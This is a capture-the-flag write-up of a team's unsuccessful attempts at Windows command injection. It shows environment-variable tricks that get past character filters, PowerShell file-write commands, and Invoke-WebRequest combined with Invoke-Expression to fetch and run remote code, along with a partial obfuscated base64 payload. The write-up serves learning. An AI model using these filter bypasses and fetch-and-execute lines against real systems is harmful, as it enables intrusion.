# 02 - Rise to the challenge

Our team never managed to actually solve this challenge. This said, we found tricks during the challenge that could be useful for Windows RCE.

## Bypass Illegal Characters

We can generate the following characters with environment variables:

```
Space -> %PROGRAMFILES:~10,-5%
\ -> %ALLUSERSPROFILE:~2,1%
/ -> %WINDBG_DOWNLOAD_URL:~6,1%
```

## Powershell

We can run powershell using the following:

```
powershell%PROGRAMFILES:~10,-5%-c%PROGRAMFILES:~10,-5%...
```

## File Write

Being able to write to a file could be very interesting. We did some testing but were only able to generate a directory by accident. There was maybe write protections on the directory, but never managed to figure out. Here is a sample command we tried to run (with illegal character bypass):

```
powershell -c $d=$(echo \path\to\file);$x=$(echo data);$x|Out-File -FilePath $d;
```

We are uncertain if the issue was the piping...

## Web Requests

A typical trick to bypass illegal characters is to pipe in a script from a web request. The most reliable way to do so with Powershell is using:

```
Invoke-WebRequest URL
```

In our case, we had issues using quotes, which led to the following payload (where special characters were encoded with prior tricks):

```
$x=$(echo http://url);$y=Invoke-WebRequest $x
```

If we requested to a machine we owned, we got a request. This said, no matter the configuration, we were unable to verify if the content ever reached the server. We attempted to `echo $y` from previously and got no response (possibly bigger than the buffer)? We also tried piping the request payload to `Invoke-Expression` but never got it to run.

## Encoded Payload

Our last direction was to try pass our payload as base64. This would require running the following:

```
[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(...))
```

Not sure why Powershell doesn't have `base64 -d` like Linux... This forced having to encode the square brackets because URL cannot contain them. There is no enviornment variable that contains the character, therefore we would have to generate the character from Powershell. This said, string conversion operations also require square brackets... This is what stumped us... This said, if with a solution, we could contruct a payload as follows (with illegal character bypass to add):

```
$ob=[;$cb=];$ste=$(echo System.Text.Encoding);$ste=$ob+$ste+$cb;...;$b64o=$front+B64_PAYLOAD+$back;$payload=$(Invoke-Expression $b64o);Invoke-Expression $payload
```

## Conclusion

The paths that we went down into were most likely more complex than the intended solution. Our lack of knowledge of Windows and most of us not having Windows was probably what stumped us. 
